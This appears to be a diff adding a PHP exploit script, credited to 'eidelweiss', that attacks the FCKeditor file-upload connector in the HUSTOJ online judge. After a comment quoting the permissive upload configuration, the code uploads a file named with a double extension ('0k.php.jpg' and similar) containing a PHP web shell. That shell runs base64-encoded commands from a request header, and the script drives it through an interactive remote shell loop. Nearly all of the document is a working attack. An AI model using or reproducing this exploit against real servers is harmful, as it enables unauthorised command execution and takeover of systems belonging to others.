@@ -1,0 +1,135 @@
+<?php
+/*
+ -----------------------------------------------------------------
+ hustoj (fckeditor) Remote Arbitrary File Upload Exploit
+ -----------------------------------------------------------------
+ Hustoj is HUST ACM OnlineJudge with GNU/GPL v2 License
+ Download : http://code.google.com/p/hustoj/downloads/list
+ exploited by ..: eidelweiss (g1xsystem@windowslive.com)
+ Special thanks to : all friends & all Hacker`s
+
+ nb to: Sn!pEr.S!Te Hacker => check this out bro => http://www.hack0wn.com/view.php?xroot=1267.0&cat=exploits
+
+ details..: works with an Apache server with the mod_mime module installed (if specific)
+  
+ [-] vulnerable code in path/web/fckeditor/editor/filemanager/connectors/php/config.php
+     
+    [*] // SECURITY: You must explicitly enable this "connector". (Set it to "true").
+    [*] 
+    [*]	$Config['Enabled'] = true ;
+    [*]
+    [*] // Path to user files relative to the document root.
+    [*] $Config['UserFilesPath'] = '/upload/'.date("Ym")."/"  ;
+    [*]
+    [*] // Fill the following value it you prefer to specify the absolute path for the
+    [*] // user files directory. Usefull if you are using a virtual directory, symbolic
+    [*] // link or alias. Examples: 'C:\\MySite\\UserFiles\\' or '/root/mysite/UserFiles/'.
+    [*] // Attention: The above 'UserFilesPath' must point to the same directory.
+    [*] 
+    [*]
+    [*] $Config['AllowedExtensions']['File']	= array('7z', 'aiff', 'asf', 'avi', 'bmp', 'csv', 'doc', 'fla', 'flv', 'gif', 'gz', [....]
+    [*] $Config['DeniedExtensions']['File']     = array() ;
+    [*]
+    [*] $Config['AllowedExtensions']['Image']   = array('bmp','gif','jpeg','jpg','png') ;
+    [*] $Config['DeniedExtensions']['Image']    = array() ;
+    [*]
+    [*] $Config['AllowedExtensions']['Flash']   = array('swf','flv') ;
+    [*] $Config['DeniedExtensions']['Flash']    = array() ;
+    [*]
+    [*] $Config['AllowedExtensions']['Media']   = array('aiff', 'asf', 'avi', 'bmp', 'fla', 'flv', 'gif', 'jpeg', 'jpg', 'mid', 'mov', 'mp3', 'mp4', 'mpc', 'mpeg', 'mpg', 'png', 'qt', 'ram', 'rm', 'rmi', 'rmvb', 'swf', 'tif', 'tiff', 'wav', 'wma', 'wmv') ;
+    [*] $Config['DeniedExtensions']['Media']    = array() ;
+     
+    with a default configuration of this script, an attacker might be able to upload arbitrary
+    files containing malicious PHP code due to multiple file extensions isn't properly checked
+*/
+ 
+*/
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+function http_send($host, $packet)
+{
+ $sock = fsockopen($host, 80);
+ while (!$sock)
+ {
+  print "\n[-] No response from {$host}:80 Trying again...";
+  $sock = fsockopen($host, 80);
+ }
+ fputs($sock, $packet);
+ while (!feof($sock)) $resp .= fread($sock, 1024);
+ fclose($sock);
+ return $resp;
+}
+function upload()
+{
+ global $host, $path;
+  
+ $connector = "/web/fckeditor/editor/filemanager/connectors/php/config.php";
+ $file_ext  = array("zip", "jpg", "fla", "doc", "xls", "rtf", "csv");
+  
+ foreach ($file_ext as $ext)
+ {
+  print "\n[-] Trying to upload with .{$ext} extension...";
+   
+  $data  = "--abcdef\r\n";
+  $data .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"0k.php.{$ext}\"\r\n";
+  $data .= "Content-Type: application/octet-stream\r\n\r\n";
+  $data .= "<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?>\r\n";
+  $data .= "--abcdef--\r\n";
+   
+  $packet  = "POST {$path}{$connector}?Command=FileUpload&CurrentFolder={$path} HTTP/1.0\r\n";
+  $packet .= "Host: {$host}\r\n";
+  $packet .= "Content-Length: ".strlen($data)."\r\n";
+  $packet .= "Content-Type: multipart/form-data; boundary=abcdef\r\n";
+  $packet .= "Connection: close\r\n\r\n";
+  $packet .= $data;
+   
+  preg_match("/OnUploadCompleted\((.*),'(.*)'\)/i", http_send($host, $packet), $html);
+   
+  if (!in_array(intval($html[1]), array(0, 201))) die("\n[-] Upload failed! (Error {$html[1]}: {$html[2]})\n");
+   
+  $packet  = "GET {$path}0k.php.{$ext} HTTP/1.0\r\n";
+  $packet .= "Host: {$host}\r\n";
+  $packet .= "Connection: close\r\n\r\n";
+  $html    = http_send($host, $packet);
+   
+  if (!eregi("print", $html) and eregi("_code_", $html)) return $ext;
+   
+  sleep(1);
+ }
+  
+ return false;
+}
+print "\n+-----------------------------------------------------------------+";
+print "\n| hustoj (fckeditor) Remote Arbitrary File Upload Exploit by eidelweiss |";
+print "\n+-----------------------------------------------------------------+\n";
+if ($argc < 3)
+{
+ print "\nUsage......: php $argv[0] host path\n";
+ print "\nExample....: php $argv[0] localhost /";
+ print "\nExample....: php $argv[0] localhost /hustoj/\n";
+ die();
+}
+$host = $argv[1];
+$path = $argv[2];
+if (!($ext = upload())) die("\n\n[-] Exploit failed...\n");
+else print "\n[-] Shell uploaded...starting it!\n";
+define(STDIN, fopen("php://stdin", "r"));
+while(1)
+{
+ print "\hustoj-shell# ";
+ $cmd = trim(fgets(STDIN));
+ if ($cmd != "exit")
+ {
+  $packet = "GET {$path}0k.php.{$ext} HTTP/1.0\r\n";
+  $packet.= "Host: {$host}\r\n";
+  $packet.= "Cmd: ".base64_encode($cmd)."\r\n";
+  $packet.= "Connection: close\r\n\r\n";
+  $html   = http_send($host, $packet);
+  if (!eregi("_code_", $html)) die("\n[-] Exploit failed...\n");
+  $shell = explode("_code_", $html);
+  print "\n{$shell[1]}";
+ }
+ else break;
+}
+?>
